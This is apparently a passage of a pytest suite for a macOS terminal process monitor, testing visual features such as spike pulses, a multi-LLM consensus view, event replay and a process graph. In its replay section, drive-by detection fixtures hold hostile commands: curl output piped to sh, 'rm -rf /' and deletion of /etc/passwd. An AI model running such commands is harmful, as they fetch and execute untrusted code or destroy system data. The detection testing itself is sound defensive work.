"""Tests for the visual feature set.

Each section corresponds to one feature so test failures are easy to
attribute. The shared `monitor` fixture lives in conftest.py.

Features:
  1. Process Event Ripples       — colored row pulse on CPU/net/disk spikes
  4. Three-Model Consensus Race  — streamed parallel LLM lanes
  5. Attack Chain Replay         — scrubbable event playback
  6. Network Orbit               — animated remote-endpoint constellation
  7. Process Galaxy              — force-directed process-tree graph
"""
from __future__ import annotations

import os
import sys
import time
import threading
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import procmon


# ── 1. Process Event Ripples ──────────────────────────────────────────


def _proc(pid, cpu=0.0, net_in=0, net_out=0, disk_in=0, disk_out=0):
    return {
        "pid": pid, "cpu": cpu,
        "net_in": net_in, "net_out": net_out,
        "disk_in": disk_in, "disk_out": disk_out,
    }


class TestRowPulses:
    def test_no_pulse_on_first_tick(self, monitor):
        # First tick has no prior snapshot, so no pulse can be armed.
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 not in monitor._row_pulses

    def test_cpu_spike_triggers_salmon_pulse(self, monitor):
        monitor._update_row_pulses([_proc(1, cpu=2.0)])
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 in monitor._row_pulses
        color_pair_id, frames = monitor._row_pulses[1]
        assert color_pair_id == 12  # salmon = CPU spike
        assert frames == monitor._pulse_frames

    def test_net_burst_triggers_light_green_pulse(self, monitor):
        monitor._update_row_pulses([_proc(1, net_in=0, net_out=0)])
        # 2 MB/s spike — well above 1 MB/s threshold
        monitor._update_row_pulses(
            [_proc(1, net_in=2 * 1024 * 1024, net_out=0)])
        assert 1 in monitor._row_pulses
        color_pair_id, _ = monitor._row_pulses[1]
        assert color_pair_id == 11  # light green

    def test_disk_burst_triggers_pulse(self, monitor):
        monitor._update_row_pulses([_proc(1, disk_in=0)])
        monitor._update_row_pulses([_proc(1, disk_in=10 * 1024 * 1024)])
        assert 1 in monitor._row_pulses
        color_pair_id, _ = monitor._row_pulses[1]
        assert color_pair_id == 11

    def test_pulse_decays_each_tick(self, monitor):
        monitor._update_row_pulses([_proc(1, cpu=2.0)])
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        start_frames = monitor._row_pulses[1][1]
        # Successive non-spiking ticks should decay until the entry is gone.
        for _ in range(start_frames + 1):
            monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 not in monitor._row_pulses

    def test_pulse_attr_returns_zero_when_no_pulse(self, monitor):
        assert monitor._row_pulse_attr(999) == 0

    def test_pulse_attr_returns_nonzero_when_armed(self, monitor):
        monitor._row_pulses[42] = (12, 3)
        with patch.object(procmon.curses, "color_pair", return_value=0x100):
            with patch.object(procmon.curses, "A_BOLD", 0x200):
                attr = monitor._row_pulse_attr(42)
        assert attr != 0

    def test_dead_pids_dropped_from_pulses(self, monitor):
        monitor._update_row_pulses([_proc(1, cpu=2.0)])
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 in monitor._row_pulses
        # Process 1 disappears — pulse should be dropped immediately.
        monitor._update_row_pulses([_proc(2, cpu=2.0)])
        assert 1 not in monitor._row_pulses


# ── 4. Three-Model Consensus Race ─────────────────────────────────────


class TestConsensusRace:
    def test_lane_state_init(self, monitor):
        assert set(monitor._consensus_lanes.keys()) == {
            "claude", "codex", "gemini"}
        assert monitor._consensus_running is False
        assert monitor._consensus_risk_bar == 0

    def test_run_llms_parallel_streaming_resets_lanes(self, monitor):
        monitor._consensus_lanes = {"claude": ["stale"], "codex": ["stale"],
                                     "gemini": ["stale"]}
        # Replace streaming runner with a fake that emits one line then quits.
        def fake_stream(tool, prompt, input_text, on_chunk):
            on_chunk(tool, f"first line from {tool}")
            on_chunk(tool, f"RISK: HIGH from {tool}")
            return f"DONE {tool}"
        monitor._build_analysis_input = lambda artifacts: "x"
        with patch.object(monitor, "_run_llm_streaming",
                           side_effect=fake_stream):
            results = monitor._run_llms_parallel_streaming(
                {"pid": 1, "exe_path": "/bin/x"})
        assert set(results.keys()) == {"claude", "codex", "gemini"}
        # Lane state populated for each tool
        for tool in ("claude", "codex", "gemini"):
            assert any(tool in line for line in monitor._consensus_lanes[tool])
        # Risk bar advanced to 100% after all three finish
        assert monitor._consensus_risk_bar == 100
        # done flags all set
        assert all(monitor._consensus_lane_done.values())
        # _consensus_running clears at the end
        assert monitor._consensus_running is False

    def test_legacy_run_llms_parallel_unchanged(self, monitor):
        """The original (non-streaming) path still calls `_run_llm` so the
        old test_inspect_hidden coverage doesn't break."""
        with patch.object(monitor, "_build_analysis_input",
                           return_value="x"):
            with patch.object(monitor, "_run_llm",
                               return_value="RISK: LOW") as run_llm:
                results = monitor._run_llms_parallel(
                    {"pid": 1, "exe_path": "/bin/x"})
        assert run_llm.call_count == 3
        assert all("RISK: LOW" in v for v in results.values())

    def test_consensus_race_partial_done_at_one_third(self, monitor):
        monitor._consensus_lane_done = {"claude": True, "codex": False,
                                         "gemini": False}
        finished = sum(1 for v in monitor._consensus_lane_done.values() if v)
        assert finished == 1
        # Simulate the bar update logic
        monitor._consensus_risk_bar = int(finished / 3.0 * 100)
        assert 30 <= monitor._consensus_risk_bar <= 35  # 33%

    def test_build_consensus_race_lines(self, monitor):
        with monitor._consensus_lane_lock:
            monitor._consensus_lanes["claude"] = ["RISK: HIGH",
                                                     "details about claude"]
            monitor._consensus_lanes["codex"] = ["RISK: MEDIUM",
                                                    "details about codex"]
            monitor._consensus_lanes["gemini"] = ["analysis pending"]
            monitor._consensus_lane_done = {"claude": True, "codex": True,
                                              "gemini": False}
        monitor._consensus_risk_bar = 66
        out = monitor._build_consensus_race_lines(width=120)
        joined = "\n".join(out)
        assert "claude" in joined
        assert "codex" in joined
        assert "gemini" in joined
        assert "CONSENSUS_RISK" in joined
        # Divergence (HIGH vs MEDIUM) should be flagged
        assert "DIVERGENCE" in joined

    def test_consensus_no_divergence_when_lanes_agree(self, monitor):
        with monitor._consensus_lane_lock:
            monitor._consensus_lanes["claude"] = ["RISK: HIGH"]
            monitor._consensus_lanes["codex"] = ["RISK: HIGH"]
            monitor._consensus_lanes["gemini"] = ["RISK: HIGH"]
        diverge, levels = monitor._consensus_lane_divergence()
        assert diverge is False
        assert levels == {"HIGH"}

    def test_streaming_collects_lines(self, monitor):
        # Mock subprocess.Popen so _run_llm_streaming sees a fake stdout
        from io import BytesIO
        fake_proc = MagicMock()
        fake_proc.stdout = BytesIO(b"line one\nline two\n")
        fake_proc.stderr = BytesIO(b"")
        fake_proc.stdin = BytesIO()
        fake_proc.returncode = 0
        fake_proc.wait.return_value = 0
        chunks = []

        def fake_popen(*args, **kwargs):
            return fake_proc

        with patch("subprocess.Popen", side_effect=fake_popen):
            text = monitor._run_llm_streaming(
                "claude", "prompt", "input",
                lambda tool, line: chunks.append((tool, line)))
        assert "line one" in text
        assert "line two" in text
        # Two lines should have been chunked
        assert len(chunks) >= 2

    def test_streaming_handles_missing_binary(self, monitor):
        with patch("subprocess.Popen", side_effect=FileNotFoundError):
            chunks = []
            text = monitor._run_llm_streaming(
                "claude", "prompt", "input",
                lambda tool, line: chunks.append(line))
        # Returns the error tag and chunks it
        assert "not found" in text
        assert any("not found" in c for c in chunks)


# ── 5. Attack Chain Replay ────────────────────────────────────────────


def _evt(idx, kind="exec", pid=100, ppid=1, cmd="/bin/x", ts_mono=None):
    return {
        "idx": idx, "kind": kind, "pid": pid, "ppid": ppid,
        "cmd": cmd, "ts": "", "ts_mono": ts_mono if ts_mono is not None
        else float(idx),
    }


class TestReplay:
    def test_driveby_detection_curl_to_bash(self, monitor):
        events = [
            _evt(0, "exec", pid=100, ppid=1, cmd="/usr/bin/curl http://x"),
            _evt(1, "exec", pid=101, ppid=100,
                  cmd="/bin/bash -c 'curl http://x | sh'", ts_mono=1.0),
        ]
        pairs = monitor._detect_driveby_pairs(events)
        assert (100, 101) in pairs

    def test_driveby_window_excludes_late_shells(self, monitor):
        events = [
            _evt(0, "exec", pid=100, ppid=1, cmd="curl example.com",
                  ts_mono=0.0),
            _evt(1, "exec", pid=101, ppid=100,
                  cmd="bash -c 'rm -rf /'", ts_mono=999.0),
        ]
        pairs = monitor._detect_driveby_pairs(events)
        assert (100, 101) not in pairs

    def test_driveby_no_curl_no_pair(self, monitor):
        events = [
            _evt(0, "exec", pid=100, ppid=1,
                  cmd="bash -c echo hello", ts_mono=0.0),
        ]
        pairs = monitor._detect_driveby_pairs(events)
        assert len(pairs) == 0

    def test_start_replay_with_empty_buffer_returns_false(self, monitor):
        monitor._events = []
        assert monitor._start_replay_mode() is False

    def test_start_replay_populates_events_and_pairs(self, monitor):
        monitor._events = [
            _evt(0, "exec", pid=100, cmd="curl http://evil"),
            _evt(1, "exec", pid=101, ppid=100,
                  cmd="sh -c 'rm /etc/passwd'", ts_mono=1.0),
        ]
        ok = monitor._start_replay_mode()
        assert ok is True
        assert monitor._replay_mode is True
        assert len(monitor._replay_events) == 2
        assert (100, 101) in monitor._replay_driveby_pairs

    def test_replay_step_clamps_bounds(self, monitor):
        monitor._replay_events = [_evt(0), _evt(1), _evt(2)]
        monitor._replay_cursor = 0
        monitor._replay_step(-5)
        assert monitor._replay_cursor == 0
        monitor._replay_step(5)
        assert monitor._replay_cursor == 2

    def test_replay_advance_when_playing(self, monitor):
        monitor._replay_events = [_evt(i) for i in range(5)]
        monitor._replay_mode = True
        monitor._replay_playing = True
        monitor._replay_cursor = 0
        changed = monitor._replay_advance_if_playing()
        assert changed is True
        assert monitor._replay_cursor == 1

    def test_replay_advance_stops_at_end(self, monitor):
        monitor._replay_events = [_evt(0), _evt(1)]
        monitor._replay_mode = True
        monitor._replay_playing = True
        monitor._replay_cursor = 1
        monitor._replay_advance_if_playing()
        assert monitor._replay_playing is False

    def test_replay_format_view_renders_current_event(self, monitor):
        monitor._replay_events = [
            _evt(0, "exec", pid=42, ppid=1,
                  cmd="/usr/bin/something --weird")
        ]
        monitor._replay_cursor = 0
        out = monitor._format_replay_view(width=80)
        joined = "\n".join(out)
        assert "pid=42" in joined
        assert "something" in joined

    def test_replay_format_view_shows_driveby_warning(self, monitor):
        monitor._replay_events = [
            _evt(0, "exec", pid=100, cmd="curl x")
        ]
        monitor._replay_cursor = 0
        monitor._replay_driveby_pairs = {(100, 101)}
        out = monitor._format_replay_view(width=80)
        joined = "\n".join(out)
        assert "drive-by" in joined.lower()

    def test_events_persist_buffer_on_close(self, monitor):
        monitor._events_mode = True
        monitor._events_persist_on_close = True
        monitor._events = [
            _evt(0, "exec", pid=100, cmd="curl"),
            _evt(1, "exec", pid=101, ppid=100, cmd="bash -c rm",
                  ts_mono=1.0),
        ]
        # Stub the stream stopper since the test runs under a fixture
        # without a live stream.
        monitor._stop_events_stream = lambda: None
        monitor._toggle_events_mode()
        assert monitor._events_mode is False
        assert len(monitor._replay_events) == 2
        assert (100, 101) in monitor._replay_driveby_pairs


# ── 6. Network Orbit / Constellation ──────────────────────────────────


class TestNetworkOrbit:
    def test_layout_n_remotes_returns_n_positions(self, monitor):
        positions = monitor._orbit_layout(8, (40, 10), 5)
        assert len(positions) == 8
        # Spread roughly around (40, 10)
        xs = [p[0] for p in positions]
        ys = [p[1] for p in positions]
        assert min(xs) < 40 < max(xs)
        assert min(ys) < 10 < max(ys)

    def test_layout_zero_returns_empty(self, monitor):
        assert monitor._orbit_layout(0, (10, 5), 3) == []

    def test_particle_position_wraps(self, monitor):
        # Distance 10 → particle wraps every 10 ticks.
        first = monitor._orbit_particle_position((0, 0), (10, 0), 0)
        ten = monitor._orbit_particle_position((0, 0), (10, 0), 10)
        assert first == ten

    def test_particle_position_at_midpoint(self, monitor):
        x, y = monitor._orbit_particle_position((0, 0), (10, 0), 5)
        assert x == 5
        assert y == 0

    def test_edge_color_https(self, monitor):
        assert monitor._orbit_edge_color("TCP", "https") == 9

    def test_edge_color_ssh(self, monitor):
        assert monitor._orbit_edge_color("TCP", "ssh") == 7

    def test_edge_color_udp_default_magenta(self, monitor):
        assert monitor._orbit_edge_color("UDP", "") == 8

    def test_toggle_only_when_net_mode_active(self, monitor):
        monitor._net_mode = False
        monitor._toggle_orbit_mode()
        assert monitor._orbit_mode is False
        monitor._net_mode = True
        monitor._toggle_orbit_mode()
        assert monitor._orbit_mode is True

    def test_build_orbit_lines_renders_endpoints(self, monitor):
        monitor._net_pid = 42
        monitor._net_entries = [
            {"pid": 42, "fd": "5", "proto": "TCP", "service": "https",
             "org": "Cloudflare", "addr_key": "1.2.3.4:50000->5.6.7.8:443",
             "bytes_in": 100, "bytes_out": 200, "bytes_total": 300,
             "display": "x"},
            {"pid": 42, "fd": "6", "proto": "TCP", "service": "ssh",
             "org": "Github", "addr_key": "1.2.3.4:50001->22.22.22.22:22",
             "bytes_in": 0, "bytes_out": 0, "bytes_total": 0,
             "display": "x"},
        ]
        lines = monitor._build_orbit_lines(w=80, h=24)
        joined = "\n".join(lines)
        # Center label
        assert "PID 42" in joined
        # At least one orbit endpoint glyph
        assert "○" in joined
        # Org name visible
        assert "Cloudflare" in joined or "Github" in joined

    def test_build_orbit_lines_no_country_or_city(self, monitor):
        # We must not surface country/city in orbit labels.
        monitor._net_pid = 42
        monitor._net_entries = [{
            "pid": 42, "fd": "1", "proto": "TCP", "service": "https",
            "org": "Cloudflare",
            "addr_key": "1.2.3.4:5000->5.6.7.8:443",
            "bytes_in": 0, "bytes_out": 0, "bytes_total": 0,
            "display": "",
        }]
        lines = monitor._build_orbit_lines(w=80, h=24)
        joined = "\n".join(lines)
        # No 2-letter country code in our layout — only org names.
        assert "[US]" not in joined
        assert "California" not in joined


# ── 7. Process Galaxy ─────────────────────────────────────────────────


class TestProcessGalaxy:
    def _make_rows(self, n):
        rows = []
        for i in range(n):
            rows.append({
                "pid": i + 1,
                "ppid": (i // 4) + 1,  # rough tree shape
                "cpu": float(i % 10),
                "agg_cpu": float(i % 10),
                "rss_kb": 0,
                "agg_rss_kb": 0,
                "command": f"proc{i}",
            })
        return rows

    def test_node_cap_respected(self, monitor):
        monitor.rows = self._make_rows(200)
        monitor._galaxy_node_cap = 80
        nodes = monitor._galaxy_select_nodes()
        assert len(nodes) == 80

    def test_galaxy_step_initializes_positions(self, monitor):
        monitor.rows = self._make_rows(10)
        monitor._galaxy_step(60, 20)
        assert len(monitor._galaxy_positions) == 10
        # All positions are finite numbers within bounds
        for x, y in monitor._galaxy_positions.values():
            assert isinstance(x, float)
            assert isinstance(y, float)
            assert 0.0 <= x <= 60.0
            assert 0.0 <= y <= 20.0

    def test_galaxy_step_no_nan(self, monitor):
        import math
        monitor.rows = self._make_rows(20)
        for _ in range(5):
            monitor._galaxy_step(80, 24)
        for x, y in monitor._galaxy_positions.values():
            assert not math.isnan(x)
            assert not math.isnan(y)

    def test_new_pid_glow_set(self, monitor):
        monitor.rows = self._make_rows(3)
        monitor._galaxy_step(60, 20)
        assert all(monitor._galaxy_glow.get(r["pid"]) is not None
                    for r in monitor.rows)

    def test_glow_decays(self, monitor):
        monitor.rows = self._make_rows(3)
        monitor._galaxy_step(60, 20)
        first = dict(monitor._galaxy_glow)
        monitor._galaxy_step(60, 20)
        # Glow values must not increase between ticks for the same pid set
        for pid, start_val in first.items():
            assert monitor._galaxy_glow.get(pid, 0) <= start_val

    def test_dropped_pid_removed_from_state(self, monitor):
        monitor.rows = self._make_rows(5)
        monitor._galaxy_step(60, 20)
        # Drop pid 3
        monitor.rows = [r for r in monitor.rows if r["pid"] != 3]
        monitor._galaxy_step(60, 20)
        assert 3 not in monitor._galaxy_positions

    def test_toggle_resets_state(self, monitor):
        monitor.rows = self._make_rows(5)
        monitor._galaxy_step(60, 20)
        assert monitor._galaxy_positions
        monitor._toggle_galaxy_mode()  # turn ON (was off)
        # Toggle off resets
        monitor._toggle_galaxy_mode()
        assert monitor._galaxy_mode is False

    def test_build_galaxy_lines_returns_grid(self, monitor):
        monitor.rows = self._make_rows(5)
        lines = monitor._build_galaxy_lines(80, 24)
        # Bound height is h - 6 = 18
        assert len(lines) == 18
        # All same width
        assert len({len(l) for l in lines}) == 1

    def test_short_name_strips_paths(self, monitor):
        # bare basename
        assert monitor._galaxy_short_name(
            {"command": "/usr/bin/zsh"}) == "zsh"
        # app bundle: prefer bundle name when binary basename matches
        assert monitor._galaxy_short_name(
            {"command": "/Applications/Google Chrome.app/Contents/MacOS/"
                        "Google Chrome"}) == "Google Chrome"[:12]
        # app bundle helper: prefer the more specific binary name
        assert monitor._galaxy_short_name(
            {"command": "/Applications/Google Chrome.app/Contents/MacOS/"
                        "Google Chrome Helper (Renderer)"}
        ).startswith("Google Chrom")
        # truncates to 12 chars
        long_cmd = {"command": "/usr/bin/" + "x" * 50}
        assert len(monitor._galaxy_short_name(long_cmd)) == 12
        # missing command falls back gracefully
        assert monitor._galaxy_short_name({"command": ""}) == "?"
        assert monitor._galaxy_short_name({}) == "?"

    def test_bubble_size_scales_with_load(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024  # 16 GB
        # Idle / faint: smallest bubble (still 9x3 so name fits readably)
        idle = {"agg_cpu": 0, "agg_rss_kb": 1024}
        assert monitor._galaxy_bubble_size(idle) == (9, 3)
        # Light process
        light = {"agg_cpu": 1.0, "agg_rss_kb": 50 * 1024}
        assert monitor._galaxy_bubble_size(light) == (11, 3)
        # Active process (~10% combined)
        active = {"agg_cpu": 8.0, "agg_rss_kb": 100 * 1024}
        assert monitor._galaxy_bubble_size(active) == (13, 4)
        # Busy process
        busy = {"agg_cpu": 15.0, "agg_rss_kb": 200 * 1024}
        assert monitor._galaxy_bubble_size(busy) == (15, 5)
        # Heavy process — Chrome on a CPU spike
        heavy = {"agg_cpu": 40.0, "agg_rss_kb": 2 * 1024 * 1024}
        assert monitor._galaxy_bubble_size(heavy) == (17, 5)

    def test_render_bubble_has_box_drawing_and_name(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        row = {"pid": 100, "command": "/Applications/Slack.app/Contents/"
               "MacOS/Slack", "agg_cpu": 12.0, "agg_rss_kb": 300 * 1024}
        bw, bh = monitor._galaxy_bubble_size(row)
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        assert len(lines) == bh
        for line in lines:
            assert len(line) == bw
        # Top + bottom border use rounded box-drawing
        assert lines[0].startswith("╭") and lines[0].endswith("╮")
        assert lines[-1].startswith("╰") and lines[-1].endswith("╯")
        # Sides are vertical bars
        for mid in lines[1:-1]:
            assert mid[0] == "│" and mid[-1] == "│"
        # Process name appears somewhere inside
        body = "\n".join(lines[1:-1])
        assert "Slack" in body
        # CPU% rendered for tier-4 bubble
        assert "12%" in body

    def test_glow_prefix_in_bubble_for_new_pid(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        row = {"pid": 200, "command": "/usr/bin/launchctl",
               "agg_cpu": 0.1, "agg_rss_kb": 1024}
        monitor._galaxy_glow[200] = 5
        bw, bh = monitor._galaxy_bubble_size(row)
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        body = "\n".join(lines[1:-1])
        assert "★" in body

    def test_galaxy_lines_contain_bubble_glyphs(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor.rows = self._make_rows(5)
        # Bump one row to a heavy bubble
        monitor.rows[0]["agg_cpu"] = 50.0
        monitor.rows[0]["agg_rss_kb"] = 2 * 1024 * 1024
        monitor.rows[0]["command"] = "Chrome"
        lines = monitor._build_galaxy_lines(120, 30)
        joined = "\n".join(lines)
        # Bubbles are drawn somewhere on the canvas
        assert "╭" in joined
        assert "╯" in joined
        # The heavy process name shows up
        assert "Chrome" in joined

    def test_load_tier_classification(self, monitor):
        total = 16 * 1024 * 1024
        assert monitor._galaxy_load_tier(
            {"agg_cpu": 0, "agg_rss_kb": 0}, total) == 0
        assert monitor._galaxy_load_tier(
            {"agg_cpu": 1, "agg_rss_kb": 0}, total) == 1
        assert monitor._galaxy_load_tier(
            {"agg_cpu": 8, "agg_rss_kb": 0}, total) == 2
        assert monitor._galaxy_load_tier(
            {"agg_cpu": 15, "agg_rss_kb": 0}, total) == 3
        assert monitor._galaxy_load_tier(
            {"agg_cpu": 50, "agg_rss_kb": 0}, total) == 4

    def test_vendor_label_known_apps(self, monitor):
        cases = [
            ("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
             "google"),
            ("/Applications/Slack.app/Contents/MacOS/Slack", "slack"),
            ("/Applications/Discord.app/Contents/MacOS/Discord", "discord"),
            ("/Applications/Visual Studio Code.app/Contents/MacOS/Code",
             "vscode"),
            ("/Applications/Docker.app/Contents/MacOS/Docker Desktop",
             "docker"),
            ("/usr/sbin/distnoted", "apple"),
            ("/usr/bin/zsh", "apple"),
            ("/Users/alice/some-binary", "unknown"),
        ]
        for cmd, expected in cases:
            assert monitor._galaxy_vendor_label({"command": cmd}) == expected, \
                f"{cmd} → expected {expected}"

    def test_select_nodes_culls_pure_idle(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        # Mix: 3 active + 5 dead-idle children of unrelated parents
        monitor.rows = [
            {"pid": 1, "ppid": 0, "command": "/Applications/Chrome.app/"
             "Contents/MacOS/Google Chrome",
             "cpu": 30.0, "agg_cpu": 30.0,
             "rss_kb": 100, "agg_rss_kb": 100},
            {"pid": 2, "ppid": 0, "command": "/Applications/Slack.app/"
             "Contents/MacOS/Slack",
             "cpu": 5.0, "agg_cpu": 5.0,
             "rss_kb": 100, "agg_rss_kb": 100},
            {"pid": 3, "ppid": 0, "command": "/usr/bin/something",
             "cpu": 1.0, "agg_cpu": 1.0,
             "rss_kb": 100, "agg_rss_kb": 100},
        ] + [
            {"pid": 100 + i, "ppid": 0, "command": f"/usr/libexec/idle{i}",
             "cpu": 0.0, "agg_cpu": 0.0, "rss_kb": 0, "agg_rss_kb": 0}
            for i in range(5)
        ]
        nodes = monitor._galaxy_select_nodes()
        node_pids = {n["pid"] for n in nodes}
        # Only the three active processes survive
        assert node_pids == {1, 2, 3}
        assert monitor._galaxy_hidden_count == 5

    def test_galaxy_render_direct_does_not_raise(self, monitor):
        """Smoke test for the live curses render path. Catches typos
        like the one where the dispatcher called `_render_galaxy_direct`
        but the method was actually named `_galaxy_render_direct` —
        which broke the running app even though every other galaxy
        unit test still passed (they exercised `_build_galaxy_lines`,
        not the live render).
        """
        from unittest.mock import patch
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor._galaxy_mode = True
        monitor.rows = self._make_rows(8)
        monitor.rows[0]["agg_cpu"] = 50.0
        monitor.rows[0]["agg_rss_kb"] = 2 * 1024 * 1024
        monitor.rows[0]["command"] = (
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome")
        monitor.stdscr.getmaxyx.return_value = (40, 120)

        # Sanity: the method must exist under the documented name.
        assert hasattr(monitor, "_galaxy_render_direct"), \
            "_galaxy_render_direct must exist on ProcMonUI"

        # Stub curses so render-path tests don't need a real terminal.
        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch("curses.curs_set"), \
             patch.object(monitor, "_put"):
            # If a typo in the dispatcher slipped past unit tests, this
            # call would raise AttributeError. We only care that it
            # doesn't blow up — actual layout is covered by
            # _build_galaxy_lines tests above.
            monitor._galaxy_render_direct(5, 120)

    def test_render_dispatcher_calls_galaxy_method_by_correct_name(self):
        """Static guard against a method-name typo in the render
        dispatcher. The original bug shipped because the dispatcher
        called `_render_galaxy_direct` while the method on the class
        was actually named `_galaxy_render_direct`. Now that galaxy
        is fullscreen, the canonical entry point is
        `_galaxy_render_fullscreen` — assert THAT name is what render()
        invokes, and the historic typo is still nowhere in the file.
        """
        import pathlib
        impl_path = pathlib.Path(procmon.__file__).parent / \
            "mac_tui_procmon_impl.py"
        impl_src = impl_path.read_text(encoding="utf-8")
        assert "self._galaxy_render_fullscreen(" in impl_src, \
            "render() dispatch must call self._galaxy_render_fullscreen(...)"
        assert "_render_galaxy_direct" not in impl_src, \
            "found typo'd method name '_render_galaxy_direct' in source"
        assert "_render_galaxy_fullscreen" not in impl_src, \
            "found typo'd method name '_render_galaxy_fullscreen' in source"

    def test_galaxy_render_fullscreen_does_not_raise(self, monitor):
        """Smoke test for the live fullscreen render path."""
        from unittest.mock import patch
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor._galaxy_mode = True
        monitor.rows = self._make_rows(8)
        monitor.rows[0]["agg_cpu"] = 50.0
        monitor.rows[0]["agg_rss_kb"] = 2 * 1024 * 1024
        monitor.rows[0]["command"] = (
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome")
        monitor.stdscr.getmaxyx.return_value = (40, 120)

        assert hasattr(monitor, "_galaxy_render_fullscreen"), \
            "_galaxy_render_fullscreen must exist on ProcMonUI"

        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch("curses.curs_set"), \
             patch.object(monitor, "_put"):
            monitor._galaxy_render_fullscreen(120, 40)

    def test_galaxy_no_pairwise_rectangle_overlap(self, monitor):
        """Crypto-bubble cluster: no two bubbles are allowed to overlap
        on screen. The overlap-resolution iterations inside _galaxy_step
        must push intersecting rectangles apart along their smallest
        overlap axis. Verified after several solver ticks (the cluster
        settles within a few iterations)."""
        import random as _r
        _r.seed(42)
        monitor._total_mem_kb = 16 * 1024 * 1024
        # A mix of heavy and light bubbles, all spawned near the centre
        # so initial collisions are guaranteed.
        monitor.rows = [
            {"pid": i + 1, "ppid": 0,
             "agg_cpu": 30.0 - i * 2.0,
             "cpu": 30.0 - i * 2.0,
             "agg_rss_kb": 100,
             "rss_kb": 100,
             "command": f"/Applications/App{i}.app/Contents/MacOS/App{i}"}
            for i in range(8)
        ]
        # Several settle ticks
        for _ in range(20):
            monitor._galaxy_step(140, 40)
        # Build axis-aligned rectangles and assert no pair overlaps.
        rects = []
        for r in monitor.rows:
            cx, cy = monitor._galaxy_positions[r["pid"]]
            bw, bh = monitor._galaxy_bubble_size(r)
            rects.append((cx - bw / 2.0, cy - bh / 2.0,
                          cx + bw / 2.0, cy + bh / 2.0, r["pid"]))
        for i, a in enumerate(rects):
            for b in rects[i + 1:]:
                # Two rectangles overlap iff every axis overlaps.
                ax_overlap = a[2] > b[0] and b[2] > a[0]
                ay_overlap = a[3] > b[1] and b[3] > a[1]
                assert not (ax_overlap and ay_overlap), \
                    f"bubbles {a[4]} and {b[4]} overlap"

    def test_galaxy_floats_freely_in_2d(self, monitor):
        """Floating cluster: bubbles must occupy more than one row of
        y-coordinates (i.e. layout is genuinely 2D, not a horizontal
        line). Was a regression check after the row-fill grid produced
        single-line layouts that made the user complain."""
        import random as _r
        _r.seed(7)
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor.rows = [
            {"pid": i + 1, "ppid": 0, "agg_cpu": 5.0, "cpu": 5.0,
             "agg_rss_kb": 100, "rss_kb": 100,
             "command": f"/Applications/App{i}.app/Contents/MacOS/App{i}"}
            for i in range(12)
        ]
        for _ in range(10):
            monitor._galaxy_step(160, 32)
        ys = {round(monitor._galaxy_positions[r["pid"]][1])
              for r in monitor.rows}
        # If everything piled onto one y, the layout is broken.
        assert len(ys) >= 3, \
            "bubbles should distribute across multiple y-rows, not one line"

    def test_galaxy_drift_moves_bubbles_between_ticks(self, monitor):
        """The drift mechanic gives bubbles small per-tick velocities
        so the cluster bobs visibly on camera. Across two consecutive
        ticks (with no new PIDs) at least one bubble should have moved
        — otherwise the 'floating' effect doesn't exist."""
        import random as _r
        _r.seed(3)
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor.rows = [
            {"pid": i + 1, "ppid": 0, "agg_cpu": 5.0, "cpu": 5.0,
             "agg_rss_kb": 100, "rss_kb": 100,
             "command": f"/Applications/App{i}.app/Contents/MacOS/App{i}"}
            for i in range(6)
        ]
        monitor._galaxy_step(120, 32)
        before = {pid: tuple(pos)
                  for pid, pos in monitor._galaxy_positions.items()}
        monitor._galaxy_step(120, 32)
        after = {pid: tuple(pos)
                 for pid, pos in monitor._galaxy_positions.items()}
        moved = sum(1 for pid in before
                    if before[pid] != after.get(pid, before[pid]))
        assert moved >= 1, \
            "expected at least one bubble to drift between ticks"

    def test_main_render_takes_full_screen_in_galaxy_mode(self):
        """Static check on render() — when _galaxy_mode is true, the
        function calls _galaxy_render_fullscreen with (w, h) (the FULL
        screen) and skips the rest of the layout. We assert this in the
        source so the dispatch can't silently regress to the split-view
        path."""
        import pathlib
        impl_path = pathlib.Path(procmon.__file__).parent / \
            "mac_tui_procmon_impl.py"
        impl_src = impl_path.read_text(encoding="utf-8")
        # Find the render() definition and look for the early-return
        # galaxy block.
        marker = "if self._galaxy_mode:"
        idx = impl_src.find("def render(self):")
        assert idx >= 0, "render() not found in impl source"
        body = impl_src[idx: idx + 4000]
        assert marker in body, \
            "render() must early-branch on self._galaxy_mode"
        # The early branch invokes the fullscreen renderer.
        galaxy_branch = body[body.find(marker):]
        assert "_galaxy_render_fullscreen" in galaxy_branch[:600], \
            "render()'s _galaxy_mode branch must call _galaxy_render_fullscreen"
        assert "return" in galaxy_branch[:600], \
            "render()'s _galaxy_mode branch must early-return"

    def test_select_nodes_keeps_active_subtree_chain(self, monitor):
        """A direct parent of an interesting PID is kept even when its
        own load is zero, so the topology of the active subtree is
        preserved on the canvas."""
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor.rows = [
            # zero-load parent — would normally be culled
            {"pid": 1, "ppid": 0, "command": "/usr/bin/launchd",
             "cpu": 0.0, "agg_cpu": 0.0, "rss_kb": 0, "agg_rss_kb": 0},
            # busy child
            {"pid": 2, "ppid": 1, "command": "/Applications/Chrome.app/"
             "Contents/MacOS/Google Chrome",
             "cpu": 30.0, "agg_cpu": 30.0,
             "rss_kb": 100, "agg_rss_kb": 100},
        ]
        nodes = monitor._galaxy_select_nodes()
        node_pids = {n["pid"] for n in nodes}
